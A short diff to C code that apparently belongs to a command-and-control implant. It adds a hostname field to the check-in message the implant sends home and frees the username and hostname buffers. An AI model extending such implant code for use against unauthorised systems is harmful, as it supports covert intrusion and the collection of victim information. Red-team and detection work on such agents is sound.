@@ -48,6 +48,15 @@ char *generate_checkin_message(CheckinRequest *checkin) {
 		}
 	}
 	
+	// Optional hostname field.
+	if (checkin->hostname != 0) {
+		int host_len = MSVCRT$strlen(checkin->hostname);
+		for (int i = 0; i < host_len; i++) {
+			msg[offset] = checkin->hostname[i];
+			offset++;
+		}
+	}
+	
 	// Add the null byte (if there was no user field, this represents an empty string).
 	msg[offset] = 0;
 	offset++;
@@ -78,6 +87,8 @@ void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
 
 void free_checkin_request(CheckinRequest *request) {
 	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
+	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
+	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
 }
 
 void free_checkin_reply(CheckinReply *reply) {
